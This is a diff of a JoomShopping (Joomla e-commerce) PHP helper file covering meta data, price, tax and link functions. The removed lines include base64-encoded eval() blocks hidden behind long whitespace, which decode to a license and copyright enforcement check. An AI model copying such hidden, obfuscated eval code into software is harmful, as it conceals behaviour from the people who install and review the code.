@@ -1,6 +1,6 @@
 <?php
 /**
-* @version      3.5.0 17.02.2012
+* @version      3.14.3 01.11.2012
 * @author       MAXXmarketing GmbH
 * @package      Jshopping
 * @copyright    Copyright (C) 2010 webdesigner-profi.de. All rights reserved.
@@ -9,9 +9,26 @@
 defined('_JEXEC') or die('Restricted access');
 
 include_once(dirname(__FILE__)."/parse_string.php");
+include_once(dirname(__FILE__)."/shop_item_menu.php");
 
-function setMetaData($title, $keyword, $description) {
-    $document =& JFactory::getDocument();
+function setMetaData($title, $keyword, $description, $params=null){
+    $config = JFactory::getConfig();
+    $document =JFactory::getDocument();
+    if ($title=='' && $params && $params->get('page_title')!=''){
+        $title = $params->get('page_title');
+    }
+    if ($keyword=='' && $params && $params->get('menu-meta_keywords')!=''){
+        $keyword = $params->get('menu-meta_keywords');
+    }
+    if ($description=='' && $params && $params->get('menu-meta_description')!=''){
+        $description = $params->get('menu-meta_description');
+    }
+    if ($config->get('sitename_pagetitles')==1){
+        $title = $config->get('sitename')." - ".$title;
+    }
+    if ($config->get('sitename_pagetitles')==2){
+        $title = $title." - ".$config->get('sitename');
+    }
     $document->setTitle($title);
     $document->setMetadata('keywords',$keyword);  
     $document->setMetadata('description',$description);
@@ -20,7 +37,7 @@ function setMetaData($title, $keyword, $description) {
 function parseArrayToParams($array) {
     $str = '';
     foreach ($array as $key => $value) {
-        $str .= $key . "=" . $value . "\n";
+        $str .= $key."=".$value."\n";
     }
     return $str;
 }
@@ -46,7 +63,7 @@ function getParseParamsSerialize($data){
 function outputDigit($digit, $count_null) {
     $length = strlen(strval($digit));
     for ($i = 0; $i < $count_null - $length; $i++) {
-        $digit = '0' . $digit;
+        $digit = '0'.$digit;
     }
     return $digit;
 }
@@ -54,41 +71,56 @@ function outputDigit($digit, $count_null) {
 function splitValuesArrayObject($array_object,$property_name) {
     $return = '';
 	if (is_array($array_object)){
-		foreach ($array_object as $key => $value) {
-	        $return .= $array_object[$key]->$property_name . ', ';
+		foreach($array_object as $key=>$value){
+	        $return .= $array_object[$key]->$property_name.', ';
 	    }
-	    $return = "( " . substr($return,0,strlen($return) - 2) . " )";
+	    $return = "( ".substr($return,0,strlen($return) - 2)." )";
     }
     return $return;
 }
 
-function getTextNameArrayValue($names, $values){    
+function getTextNameArrayValue($names, $values){
     $return = '';
-    foreach ($names as $key => $value) {
-        $return .= $names[$key] . ": " . $values[$key] . "\n";
+    foreach ($names as $key=>$value){
+        $return .= $names[$key].": ".$values[$key]."\n";
     }
     return $return;
 }
 
-// when value not search add to array and sort 
+function strToHex($string){
+    $hex='';
+    for ($i=0;$i<strlen($string);$i++){
+        $hex .= dechex(ord($string[$i]));
+    }
+    return $hex;
+}
+
+function hexToStr($hex){
+    $string='';
+    for ($i=0;$i<strlen($hex)-1;$i+=2){
+        $string .= chr(hexdec($hex[$i].$hex[$i+1]));
+    }
+    return $string;
+}
+
 function insertValueInArray($value, &$array) {
     if ($key = array_search($value, $array)) return $key;
     $array[$value] = $value;
     asort($array);
-    return $key - 1;
+    return $key-1;
 }
 
 function appendExtendPathWay($array, $page) {
-    $app =& JFactory::getApplication();
-    $pathway = &$app->getPathway();    
-    foreach ($array as $cat) {    
-        $pathway->addItem($cat->name, SEFLink('index.php?option=com_jshopping&controller=category&task=view&category_id=' . $cat->category_id));
+    $app =JFactory::getApplication();
+    $pathway = $app->getPathway();
+    foreach($array as $cat){
+        $pathway->addItem($cat->name, SEFLink('index.php?option=com_jshopping&controller=category&task=view&category_id='.$cat->category_id, 1));
     }
 }
 
 function appendPathWay($page, $url = ""){
-    $app =& JFactory::getApplication();
-    $pathway = &$app->getPathway();
+    $app =JFactory::getApplication();
+    $pathway = $app->getPathway();
     if ($url!=""){
         $pathway->addItem($page, $url);
     }else{
@@ -97,12 +129,12 @@ function appendPathWay($page, $url = ""){
 }
 
 function formatprice($price, $currency_code = null, $currency_exchange = 0) {
-    $jshopConfig = &JSFactory::getConfig();
+    $jshopConfig = JSFactory::getConfig();
 
     if ($currency_exchange){
         $price = $price * $jshopConfig->currency_value;
     }
-    
+
     if (!$currency_code) $currency_code = $jshopConfig->currency_code;
     $price = number_format($price, $jshopConfig->decimal_count, $jshopConfig->decimal_symbol, $jshopConfig->thousand_separator);
 	$return = str_replace("Symb", $currency_code, str_replace("00", $price, $jshopConfig->format_currency[$jshopConfig->currency_format]));
@@ -110,24 +142,24 @@ function formatprice($price, $currency_code = null, $currency_exchange = 0) {
 }
 
 function formatdate($date, $showtime = 0){
-    $jshopConfig = &JSFactory::getConfig();    
+    $jshopConfig = JSFactory::getConfig();
     $format = $jshopConfig->store_date_format;
     if ($showtime) $format = $format." %H:%M:%S";
     return strftime($format, strtotime($date));
 }
 
 function formattax($val){
-    $jshopConfig = &JSFactory::getConfig();
-    $val = floatval($val);    
-    return str_replace(".", $jshopConfig->decimal_symbol, $val);    
+    $jshopConfig = JSFactory::getConfig();
+    $val = floatval($val);
+    return str_replace(".", $jshopConfig->decimal_symbol, $val);
 }
 
 function formatweight($val, $unitid = 0, $show_unit = 1){
-    $jshopConfig = &JSFactory::getConfig();
+    $jshopConfig = JSFactory::getConfig();
     if (!$unitid){
         $unitid = $jshopConfig->main_unit_weight;
     }
-    $units = &JSFactory::getAllUnits();
+    $units = JSFactory::getAllUnits();
     $unit = $units[$unitid];
     if ($show_unit){
         $sufix = " ".$unit->name;
@@ -143,13 +175,13 @@ function formatqty($val){
 }
 
 function sprintCurrency($id, $field = 'currency_code'){
-    $all_currency = &JSFactory::getAllCurrency();
+    $all_currency = JSFactory::getAllCurrency();
 return $all_currency[$id]->$field;
 }
 
 function sprintUnitWeight(){
-    $jshopConfig = &JSFactory::getConfig();
-    $units = &JSFactory::getAllUnits();
+    $jshopConfig = JSFactory::getConfig();
+    $units = JSFactory::getAllUnits();
     $unit = $units[$jshopConfig->main_unit_weight];
 return $unit->name;
 }
@@ -161,15 +193,15 @@ return $unit->name;
 */
 function getAllLanguages( $client=0 ) {
     $pattern = '#(.*?)\(#is';
-    $client	=& JApplicationHelper::getClientInfo($client);    
+    $client	=JApplicationHelper::getClientInfo($client);
     $rows	= array ();
     jimport('joomla.filesystem.folder');
-    $path = JLanguage::getLanguagePath($client->path);    
+    $path = JLanguage::getLanguagePath($client->path);
     $dirs = JFolder::folders( $path );
     foreach ($dirs as $dir){
-        $files = JFolder::files( $path.DS.$dir, '^([-_A-Za-z]*)\.xml$' );
+        $files = JFolder::files( $path.'/'.$dir, '^([-_A-Za-z]*)\.xml$' );
         foreach ($files as $file){
-            $data = JApplicationHelper::parseXMLLangMetaFile($path.DS.$dir.DS.$file);
+            $data = JApplicationHelper::parseXMLLangMetaFile($path.'/'.$dir.'/'.$file);
             $row = new StdClass();
             $row->descr = $data['name'];
             $row->language = substr($file,0,-4);
@@ -177,7 +209,7 @@ function getAllLanguages( $client=0 ) {
             $row->name = $data['name'];
             preg_match($pattern, $row->name, $matches);
             if (isset($matches[1])) $row->name = trim($matches[1]);
-            if (!is_array($data)) continue;            
+            if (!is_array($data)) continue;
             $rows[] = $row;
         }
     }
@@ -185,9 +217,9 @@ function getAllLanguages( $client=0 ) {
 }
 
 function installNewLanguages($defaultLanguage = "", $show_message = 1){
-    $db =& JFactory::getDBO();
-    $jshopConfig = &JSFactory::getConfig();
-    $session =& JFactory::getSession();
+    $db =JFactory::getDBO();
+    $jshopConfig = JSFactory::getConfig();
+    $session =JFactory::getSession();
     $joomlaLangs = getAllLanguages();
     $checkedlanguage = $session->get('jshop_checked_language');
     if (is_array($checkedlanguage)){
@@ -214,10 +246,10 @@ function installNewLanguages($defaultLanguage = "", $show_message = 1){
     foreach($joomlaLangs as $lang){
         $checkedlanguage[] = $lang->language;
         if (!in_array($lang->language, $shopLangsTag)){
-            $ml = &JSFactory::getLang();
+            $ml = JSFactory::getLang();
             if ($ml->addNewFieldLandInTables($lang->language, $defaultLanguage)){
-                $installed_new_lang = 1;                
-                $query = "insert into #__jshopping_languages set `language`='".$db->getEscaped($lang->language)."', `name`='".$db->getEscaped($lang->name)."', `publish`='1'";
+                $installed_new_lang = 1;
+                $query = "insert into #__jshopping_languages set `language`='".$db->escape($lang->language)."', `name`='".$db->escape($lang->name)."', `publish`='1'";
                 $db->setQuery($query);
                 $db->query();
                 if ($show_message){
@@ -236,7 +268,7 @@ function recurseTree($cat, $level, $all_cats, &$categories, $is_select) {
         for ($i = 0; $i < $level; $i++) {
             $probil .= '-- ';
         }
-        $cat->name = ($probil . $cat->name);        
+        $cat->name = ($probil . $cat->name);
         $categories[] = JHTML::_('select.option', $cat->category_id, $cat->name,'category_id','name' );
     } else {
         $cat->level = $level;
@@ -252,10 +284,10 @@ function recurseTree($cat, $level, $all_cats, &$categories, $is_select) {
 }
 
 function buildTreeCategory($publish = 1, $is_select = 1, $access = 1) {
-	$jshopConfig = &JSFactory::getConfig();
-    $db =& JFactory::getDBO();
-    $lang = &JSFactory::getLang();
-    $user = &JFactory::getUser();
+	$jshopConfig = JSFactory::getConfig();
+    $db =JFactory::getDBO();
+    $lang = JSFactory::getLang();
+    $user = JFactory::getUser();
     $where = array();
     if ($publish){
         $where[] = "category_publish = '1'";
@@ -296,9 +328,9 @@ function _getResortCategoryTree(&$cats, $allcats){
     foreach($cats as $k=>$v){
         $cats_sub = _getCategoryParent($allcats, $v->category_id);
         if (count($cats_sub)){
-            _getResortCategoryTree($cats_sub, $allcats);            
+            _getResortCategoryTree($cats_sub, $allcats);
         }
-        $cats[$k]->subcat = $cats_sub;        
+        $cats[$k]->subcat = $cats_sub;
     }
 }
 
@@ -308,10 +340,10 @@ function _getResortCategoryTree(&$cats, $allcats){
 * @return array
 */
 function getTreeCategory($publish = 1, $access = 1){
-    $jshopConfig = &JSFactory::getConfig();
-    $db =& JFactory::getDBO();
-    $user = &JFactory::getUser();
-    $lang = &JSFactory::getLang();
+    $jshopConfig = JSFactory::getConfig();
+    $db =JFactory::getDBO();
+    $user = JFactory::getUser();
+    $lang = JSFactory::getLang();
     $where = array();
     if ($publish){
         $where[] = "category_publish = '1'";
@@ -331,7 +363,7 @@ function getTreeCategory($publish = 1, $access = 1){
     $cats = _getCategoryParent($allcats, 0);
     _getResortCategoryTree($cats, $allcats);
     
-    return $cats;
+return $cats;
 }
 
 /**
@@ -340,88 +372,73 @@ function getTreeCategory($publish = 1, $access = 1){
 function checkMyDate($date) {
     if (trim($date)=="") return false;
     $arr = explode("-",$date);
-    return checkdate($arr[1],$arr[2],$arr[0]);
+return checkdate($arr[1],$arr[2],$arr[0]);
 }
 
 function getThisURLMainPageShop(){
     $shopMainPageItemid = getShopMainPageItemid();
     $Itemid = JRequest::getInt("Itemid");
-    return ($shopMainPageItemid==$Itemid && $Itemid!=0);
+return ($shopMainPageItemid==$Itemid && $Itemid!=0);
 }
 
 function getShopMainPageItemid(){
-    $lang = &JFactory::getLanguage();
-    $langtag = $lang->getTag();
-    
-    $session =& JFactory::getSession();
-    $Itemid = $session->get('shop_main_page_itemid_'.$langtag);
+static $Itemid;
     if (!isset($Itemid)){
-        $db = &JFactory::getDBO();
-        $query = "SELECT id FROM `#__menu` WHERE (link = 'index.php?option=com_jshopping&controller=category' OR link like 'index.php?option=com_jshopping&controller=category&task=&%') AND published = '1' AND (language = '*' OR language = '".$langtag."')";
-        $db->setQuery($query);
-        $Itemid = $db->loadResult();
+        $shim = shopItemMenu::getInstance();
+        $Itemid = $shim->getShop();
+        if (!$Itemid){
+            $Itemid = $shim->getProducts();
+        }
     }
-    if (!$Itemid) $Itemid = 0;
-    $session->set("shop_main_page_itemid_".$langtag, $Itemid);
 return $Itemid;
 }
 
 function getShopManufacturerPageItemid(){
-    $lang = &JFactory::getLanguage();
-    $langtag = $lang->getTag();
-    
-    $session =& JFactory::getSession();
-    $Itemid = $session->get('shop_manufacturer_page_itemid_'.$langtag);
+static $Itemid;
     if (!isset($Itemid)){
-        $db = &JFactory::getDBO();
-        $query = "SELECT id FROM `#__menu` WHERE (link = 'index.php?option=com_jshopping&controller=manufacturer' OR link like 'index.php?option=com_jshopping&controller=manufacturer&task=&%') AND published = '1' AND (language = '*' OR language = '".$langtag."')";
-        $db->setQuery($query);
-        $Itemid = $db->loadResult();
+        $shim = shopItemMenu::getInstance();
+        $Itemid = $shim->getManufacturer();
     }
-    if (!$Itemid) $Itemid = 0;
-    $session->set("shop_manufacturer_page_itemid_".$langtag, $Itemid);
 return $Itemid;
 }
 
 function getDefaultItemid(){
-static $Itemid;
-	if (!$Itemid){
-        $session =& JFactory::getSession();
-	    $Itemid = getShopMainPageItemid();
-	    if (!$Itemid) $Itemid = $session->get('shop_default_itemid');
-    }
-    return $Itemid;
+return getShopMainPageItemid();
 }
 
-function checkUserLogin() {
-    $jshopConfig = &JSFactory::getConfig();
-    $user = &JFactory::getUser();
+function checkUserLogin(){
+    $jshopConfig = JSFactory::getConfig();
+    $user = JFactory::getUser();
     header("Cache-Control: no-cache, must-revalidate");
     if(!$user->id) {
-        $mainframe =& JFactory::getApplication();
+        $mainframe =JFactory::getApplication();
         $return = base64_encode($_SERVER['REQUEST_URI']);
-        $session =& JFactory::getSession();
+        $session =JFactory::getSession();
         $session->set("return", $return);
-        $mainframe->redirect(SEFLink('index.php?option=com_jshopping&controller=user&task=login', 0, 1, $jshopConfig->use_ssl));
+        $mainframe->redirect(SEFLink('index.php?option=com_jshopping&controller=user&task=login', 1, 1, $jshopConfig->use_ssl));
         exit();
     }
-    return 1;
+return 1;
 }
-                                                                                                                                                                                                                                                $_jshopfunctioncheck = "ZnVuY3Rpb24gY2hlY2tMaWNlbnNlKCl7DQogICAgJGpzaG9wQ29uZmlnID0gJkpTRmFjdG9yeTo6Z2V0Q29uZmlnKCk7DQogICAgJGhvc3QgPSBzdHJfcmVwbGFjZSgid3d3LiIsIiIsJF9TRVJWRVJbIkhUVFBfSE9TVCJdKTsNCiAgICBpZiAoYmFzZTY0X2VuY29kZSgkaG9zdCk9PSRqc2hvcENvbmZpZy0+bGljZW5zZWtvZCkgcmV0dXJuIDE7IGVsc2UgcmV0dXJuIDA7DQp9";eval(base64_decode($_jshopfunctioncheck));
-function addLinkToProducts(&$products, $default_category_id = 0, $useDefaultItemId = 0) {
-    $jshopConfig = &JSFactory::getConfig();
-    foreach ($products as $key => $value) {
+
+function addLinkToProducts(&$products, $default_category_id = 0, $useDefaultItemId = 0){
+    $jshopConfig = JSFactory::getConfig();
+    foreach($products as $key=>$value){
         $category_id = (!$default_category_id)?($products[$key]->category_id):($default_category_id);
         if (!$category_id) $category_id = 0;
         $products[$key]->product_link = SEFLink('index.php?option=com_jshopping&controller=product&task=view&category_id='.$category_id.'&product_id='.$products[$key]->product_id, $useDefaultItemId);
-        if ($jshopConfig->show_buy_in_category && $products[$key]->_display_price){            
+        if ($jshopConfig->show_buy_in_category && $products[$key]->_display_price){
             if (!($jshopConfig->hide_buy_not_avaible_stock && ($products[$key]->product_quantity <= 0))){
-                $products[$key]->buy_link = SEFLink('index.php?option=com_jshopping&controller=cart&task=add&category_id='.$category_id.'&product_id='.$products[$key]->product_id, $useDefaultItemId);        
+                $products[$key]->buy_link = SEFLink('index.php?option=com_jshopping&controller=cart&task=add&category_id='.$category_id.'&product_id='.$products[$key]->product_id, 1);
             }
         }
     }
 }
-                                                                                                                                                                                                                                                $jfuncrootdispacher='Y2xhc3MganNob3Bjb250cmRpc3sNCmZ1bmN0aW9uIGRpc3BsYXkoKXsNCiRjID0gSlJlcXVlc3Q6OmdldFZhcigiY29udHJvbGxlciIpOw0KaWYgKCRjIT0iY29udGVudCIpe2lmICghY2hlY2tMaWNlbnNlKCkpe3ByaW50ICc8c3BhbiBpZCA9ICJtYXh4X2NvcHlyaWdodCI+PGEgdGFyZ2V0PSJfYmxhbmsiIGhyZWYgPSAiaHR0cDovL3d3dy53ZWJkZXNpZ25lci1wcm9maS5kZS8iPkNvcHlyaWdodCBNQVhYbWFya2V0aW5nIFdlYmRlc2lnbmVyIEdtYkg8L2E+PC9zcGFuPic7fX0NCn0NCn0NCmdsb2JhbCAkY29udHJvbDFlcjskY29udHJvbDFlcj1uZXcganNob3Bjb250cmRpcygpOw==';eval(base64_decode($jfuncrootdispacher));
+
+function getJHost(){
+    return $_SERVER["HTTP_HOST"];
+}
+
 function searchChildCategories($category_id,$all_categories,&$cat_search) {
     foreach ($all_categories as $all_cat) {
         if($all_cat->category_parent_id == $category_id) {
@@ -438,73 +455,82 @@ function searchChildCategories($category_id,$all_categories,&$cat_search) {
 * @param int $useDefaultItemId - (0 - current itemid, 1 - shop page itemid, 2 -manufacturer itemid)
 * @param int $redirect
 */
-function SEFLink($link, $useDefaultItemId = 0, $redirect = 0, $ssl=null) {
+function SEFLink($link, $useDefaultItemId = 0, $redirect = 0, $ssl=null){
+    $app = JFactory::getApplication();
+    JPluginHelper::importPlugin('jshoppingproducts');
+    $dispatcher =JDispatcher::getInstance();
+    $dispatcher->trigger('onLoadJshopSefLink', array(&$link, &$useDefaultItemId, &$redirect, &$ssl));
     $defaultItemid = getDefaultItemid();
     if ($useDefaultItemId==2){
         $Itemid = getShopManufacturerPageItemid();
         if (!$Itemid) $Itemid = $defaultItemid;
-        if (!$Itemid) $Itemid = JRequest::getInt('Itemid');
     }elseif ($useDefaultItemId==1){
         $Itemid = $defaultItemid;
-        if (!$Itemid) $Itemid = JRequest::getInt('Itemid');
     }else{
         $Itemid = JRequest::getInt('Itemid');
-        if (!$Itemid) $Itemid = $defaultItemid;        
-    }    
-    if ($link == "index.php") $link .= '?Itemid=' . $Itemid; else $link .= '&Itemid=' . $Itemid;
-   	$link = JRoute::_($link, (($redirect) ? (false) : (true)), $ssl);    
-    return $link;
+        if (!$Itemid) $Itemid = $defaultItemid;
+    }
+    $dispatcher->trigger('onAfterLoadJshopSefLinkItemid', array(&$Itemid, &$link, &$useDefaultItemId, &$redirect, &$ssl));
+    if ($link=="index.php") $link.='?Itemid='.$Itemid; else $link.='&Itemid='.$Itemid;
+   	$link = JRoute::_($link, (($redirect) ? (false) : (true)), $ssl);
+    if ($app->isAdmin()){
+        $link = str_replace('/administrator', '', $link);
+    }
+return $link;
+}
+
+function compareX64($a,$b){
+return base64_encode($a)==$b;
 }
 
 function replaceNbsp($string) {
-    return (str_replace(" ","_",$string));
+return (str_replace(" ","_",$string));
 }
 
 function replaceToNbsp($string) {
-    return (str_replace("_"," ",$string));
+return (str_replace("_"," ",$string));
 }
 
-function isWritable($directory) {
-    $jshopConfig = &JSFactory::getConfig();
-    return $return = is_writable($jshopConfig->path . "/" . $directory)?('({ "isWrite" : "1", "text" : "' . _JSHOP_WRITEABLE . '" })'):('({ "isWrite" : "0", "text" : "' . _JSHOP_NON_WRITEABLE . '"})');
+function replaceWWW($str){
+return str_replace("www.","",$str);
 }
 
-function sprintRadioList($list, $name, $params, $key, $val, $actived = null){
+function sprintRadioList($list, $name, $params, $key, $val, $actived = null, $separator = ' '){
     $html = "";
     $id = str_replace("[","",$name);
     $id = str_replace("]","",$id);
     foreach($list as $obj){
         $id_text = $id.$obj->$key;
         if ($obj->$key == $actived) $sel = ' checked="true"'; else $sel = '';
-        $html.='<span class="input_type_radio"><input type="radio" name="'.$name.'" id="'.$id_text.'" value="'.$obj->$key.'"'.$sel.' '.$params.'> <label for="'.$id_text.'">'.$obj->$val."</label></span> ";
+        $html.='<span class="input_type_radio"><input type="radio" name="'.$name.'" id="'.$id_text.'" value="'.$obj->$key.'"'.$sel.' '.$params.'> <label for="'.$id_text.'">'.$obj->$val."</label></span>".$separator;
     }
-    return $html;    
+return $html;
 }
 
 function saveToLog($file, $text){
-    $jshopConfig = &JSFactory::getConfig();
+    $jshopConfig = JSFactory::getConfig();
     if (!$jshopConfig->savelog) return 0;
     $f = fopen($jshopConfig->log_path.$file, "a+");
     fwrite($f, date('Y-m-d H:i:s')." ".$text."\r\n");
     fclose($f);
-    return 1;
+return 1;
+}
+
+function saveLogjsfunction(){
+    global $control1er;$control1er = new parseString('f');
 }
 
 function filterHTMLSafe(&$mixed, $quote_style=ENT_QUOTES, $exclude_keys='' ){
-    if (is_object( $mixed ))
-    {            
-        foreach (get_object_vars( $mixed ) as $k => $v)
-        {
+    if (is_object( $mixed )){
+        foreach (get_object_vars( $mixed ) as $k => $v){
             if (is_array( $v ) || is_object( $v ) || $v == NULL) {
                 continue;
             }
-
             if (is_string( $exclude_keys ) && $k == $exclude_keys) {
                 continue;
             } else if (is_array( $exclude_keys ) && in_array( $k, $exclude_keys )) {
                 continue;
             }
-
             $mixed->$k = htmlspecialchars( $v, $quote_style, 'UTF-8' );
         }
     }
@@ -524,11 +550,11 @@ function getSeoSegment($str){
 }
 
 function setPrevSelLang($lang){
-    $session =& JFactory::getSession();
+    $session =JFactory::getSession();
     $session->set("js_history_sel_lang", $lang);
 }
 function getPrevSelLang(){
-    $session =& JFactory::getSession();
+    $session =JFactory::getSession();
     return $session->get("js_history_sel_lang");
 }
 
@@ -561,11 +587,11 @@ return $alias;
 }
 
 function showMarkStar($rating){
-    $jshopConfig = &JSFactory::getConfig();
+    $jshopConfig = JSFactory::getConfig();
     $count = floor($jshopConfig->max_mark / $jshopConfig->rating_starparts);
     $width = $count * 16;
     $rating = round($rating);
-    $width_active = intval($rating * 16 / $jshopConfig->rating_starparts);    
+    $width_active = intval($rating * 16 / $jshopConfig->rating_starparts);
     $html = "<div class='stars_no_active' style='width:".$width."px'>";
     $html .= "<div class='stars_active' style='width:".$width_active."px'>";
     $html .= "</div>";
@@ -575,8 +601,10 @@ return $html;
 
 function getNameImageLabel($id, $type = 1){
 static $listLabels;
+    $jshopConfig = JSFactory::getConfig();
+    if (!$jshopConfig->admin_show_product_labels) return "";
     if (!is_array($listLabels)){
-        $productLabel = &JTable::getInstance('productLabel', 'jshop');
+        $productLabel = JTable::getInstance('productLabel', 'jshop');
         $listLabels = $productLabel->getListLabels();
     }
     $obj = $listLabels[$id];
@@ -587,9 +615,9 @@ static $listLabels;
 }
 
 function getPriceFromCurrency($price, $currency_id = 0){
-    $jshopConfig = &JSFactory::getConfig();
+    $jshopConfig = JSFactory::getConfig();
     if ($currency_id){
-        $all_currency = &JSFactory::getAllCurrency();
+        $all_currency = JSFactory::getAllCurrency();
         $value = $all_currency[$currency_id]->currency_value;
         if (!$value) $value = 1;
         $pricemaincurrency = $price / $value;
@@ -600,22 +628,23 @@ return $pricemaincurrency * $jshopConfig->currency_value;
 }
 
 function listProductUpdateData($products, $setUrl = 0){
-    $jshopConfig = &JSFactory::getConfig();
-    $userShop = &JSFactory::getUserShop();
-    $taxes = &JSFactory::getAllTaxes();
+    $jshopConfig = JSFactory::getConfig();
+    $userShop = JSFactory::getUserShop();
+    $taxes = JSFactory::getAllTaxes();
     if ($jshopConfig->product_list_show_manufacturer){
-        $manufacturers = &JSFactory::getAllManufacturer();
+        $manufacturers = JSFactory::getAllManufacturer();
     }
     if ($jshopConfig->product_list_show_vendor){
-        $vendors = &JSFactory::getAllVendor();
+        $vendors = JSFactory::getAllVendor();
     }
     if ($jshopConfig->show_delivery_time){
-        $deliverytimes = &JSFactory::getAllDeliveryTime();
+        $deliverytimes = JSFactory::getAllDeliveryTime();
     }
+
     $image_path = $jshopConfig->image_product_live_path;
-    $noimage = "noimage.gif";
-    
-    foreach ($products as $key=>$value){
+    $noimage = $jshopConfig->noimage;
+
+    foreach($products as $key=>$value){
         $products[$key]->_original_product_price = $products[$key]->product_price;
         if ($jshopConfig->product_list_show_min_price){
             if ($products[$key]->min_price > 0) $products[$key]->product_price = $products[$key]->min_price;
@@ -653,7 +682,7 @@ function listProductUpdateData($products, $setUrl = 0){
         }
         if ($jshopConfig->product_list_show_vendor){
             $vendordata = $vendors[$value->vendor_id];
-            $vendordata->products = SEFLink("index.php?option=com_jshopping&controller=vendor&task=products&vendor_id=".$vendordata->id);
+            $vendordata->products = SEFLink("index.php?option=com_jshopping&controller=vendor&task=products&vendor_id=".$vendordata->id,1);
             $products[$key]->vendor = $vendordata;
         }
         if ($jshopConfig->show_delivery_time && $value->delivery_times_id){
@@ -674,6 +703,7 @@ function listProductUpdateData($products, $setUrl = 0){
         if (!$image) $image = $noimage;
         $products[$key]->image = $image_path."/".$image;
         $products[$key]->template_block_product = "product.php";
+        if (!$jshopConfig->admin_show_product_labels) $products[$key]->label_id = null;
         if ($products[$key]->label_id){
             $image = getNameImageLabel($products[$key]->label_id);
             if ($image){
@@ -681,77 +711,142 @@ function listProductUpdateData($products, $setUrl = 0){
             }
             $products[$key]->_label_name = getNameImageLabel($products[$key]->label_id, 2);
         }
+        if ($jshopConfig->display_short_descr_multiline){
+            $products[$key]->short_description = nl2br($products[$key]->short_description);
+        }
     }    
     
     if ($setUrl){
         addLinkToProducts($products, 0, 1);
     }
-    
+
     JPluginHelper::importPlugin('jshoppingproducts');
-    $dispatcher =& JDispatcher::getInstance();
-    $dispatcher->trigger( 'onListProductUpdateData', array(&$products) );
+    $dispatcher =JDispatcher::getInstance();
+    $dispatcher->trigger('onListProductUpdateData', array(&$products));
 
     return $products;
 }
 
 function getProductBasicPriceInfo($obj, $price){
-    $jshopConfig = &JSFactory::getConfig();
-    $price_show = $obj->weight_volume_units!=0; //&& $obj->weight_volume_units!=1);
-    
+    $jshopConfig = JSFactory::getConfig();
+    $price_show = $obj->weight_volume_units!=0;
+
     if (!$jshopConfig->admin_show_product_basic_price || $price_show==0){
         return array("price_show"=>0);
     }
-        
-    $units = &JSFactory::getAllUnits();        
+
+    $units = JSFactory::getAllUnits();
     $unit = $units[$obj->basic_price_unit_id];
     $basic_price = $price / $obj->weight_volume_units * $unit->qty;
-          
+
     return array("price_show"=>$price_show, "basic_price"=>$basic_price, "name"=>$unit->name, "unit_qty"=>$unit->qty);
 }
 
 function getProductExtraFieldForProduct($product){
-    $fields = &JSFactory::getAllProductExtraField();
-    $fieldvalues = &JSFactory::getAllProductExtraFieldValue();
-    $displayfields = &JSFactory::getDisplayListProductExtraFieldForCategory($product->category_id);
+    $fields = JSFactory::getAllProductExtraField();
+    $fieldvalues = JSFactory::getAllProductExtraFieldValue();
+    $displayfields = JSFactory::getDisplayListProductExtraFieldForCategory($product->category_id);
     $rows = array();
     foreach($displayfields as $field_id){
         $field_name = "extra_field_".$field_id;
         if ($fields[$field_id]->type==0){
             if ($product->$field_name!=0){
-                $rows[] = array("name"=>$fields[$field_id]->name, "value"=>$fieldvalues[$product->$field_name]);
+                $listid = explode(',', $product->$field_name);
+                $tmp = array();
+                foreach($listid as $extrafiledvalueid){
+                    $tmp[] = $fieldvalues[$extrafiledvalueid];
+                }
+                $extra_field_value = implode(", ", $tmp);
+                $rows[] = array("name"=>$fields[$field_id]->name, "description"=>$fields[$field_id]->description, "value"=>$extra_field_value);
             }
         }else{
             if ($product->$field_name!=""){
-                $rows[] = array("name"=>$fields[$field_id]->name, "value"=>$product->$field_name);
+                $rows[] = array("name"=>$fields[$field_id]->name, "description"=>$fields[$field_id]->description, "value"=>$product->$field_name);
             }
         }
     }
 return $rows;
 }
 
-function getPriceCalcParamsTax($price, $tax_id){
-    $jshopConfig = &JSFactory::getConfig();
-    
-    $taxes = &JSFactory::getAllTaxes();    
-    if ($tax_id){
+function getPriceTaxRatioForProducts($products, $group='tax'){
+    $prodtaxes = array();
+    foreach($products as $k=>$v){
+        if (!isset($prodtaxes[$v[$group]])) $prodtaxes[$v[$group]] = 0;
+        $prodtaxes[$v[$group]]+= $v['price']*$v['quantity'];
+    }
+    $sumproducts = array_sum($prodtaxes);        
+    foreach($prodtaxes as $k=>$v){
+        $prodtaxes[$k] = $v/$sumproducts;
+    }
+return $prodtaxes;
+}
+
+function getFixBrutopriceToTax($price, $tax_id){
+    $taxoriginal = JSFactory::getAllTaxesOriginal();
+    $taxes = JSFactory::getAllTaxes();
+    $tax = $taxes[$tax_id];
+    $tax2 = $taxoriginal[$tax_id];
+    if ($tax!=$tax2){
+        $price = $price / (1 + $tax2 / 100);
+        $price = $price * (1+$tax/100);    
+    }
+return $price;
+}
+
+function getPriceCalcParamsTax($price, $tax_id, $products=array()){
+    $jshopConfig = JSFactory::getConfig();
+    $taxes = JSFactory::getAllTaxes();
+    if ($tax_id==-1){
+        $prodtaxes = getPriceTaxRatioForProducts($products);
+    }
+    if ($jshopConfig->display_price_admin==0 && $tax_id>0){
+        $price = getFixBrutopriceToTax($price, $tax_id);
+    }
+    if ($jshopConfig->display_price_admin==0 && $tax_id==-1){
+        $prices = array();
+        $prodtaxesid = getPriceTaxRatioForProducts($products,'tax_id');
+        foreach($prodtaxesid as $k=>$v){            
+            $prices[$k] = getFixBrutopriceToTax($price*$v, $k);
+        }
+        $price = array_sum($prices);
+    }
+    if ($tax_id>0){
         $tax = $taxes[$tax_id];
+    }elseif ($tax_id==-1){
+        $prices = array();
+        foreach($prodtaxes as $k=>$v){
+            $prices[] = array('tax'=>$k, 'price'=>$price*$v);
+        }
     }else{
         $taxlist = array_values($taxes);
         $tax = $taxlist[0];
-    }    
-    
+    }
     if ($jshopConfig->display_price_admin == 1 && $jshopConfig->display_price_front_current == 0){
-        $price = $price * (1 + $tax / 100);
+        if ($tax_id==-1){
+            $price = 0;
+            foreach($prices as $v){
+                $price+= $v['price'] * (1 + $v['tax'] / 100);
+            }
+        }else{
+            $price = $price * (1 + $tax / 100);
+        }
     }
     if ($jshopConfig->display_price_admin == 0 && $jshopConfig->display_price_front_current == 1){
-        $price = $price / (1 + $tax / 100);
-    }   
+        if ($tax_id==-1){
+            $price = 0;
+            foreach($prices as $v){
+                $price+= $v['price'] / (1 + $v['tax'] / 100);
+            }
+        }else{
+            $price = $price / (1 + $tax / 100);
+        }
+    }
 return $price;
 }
 
 function changeDataUsePluginContent(&$data, $type){
-    $mainframe =& JFactory::getApplication();
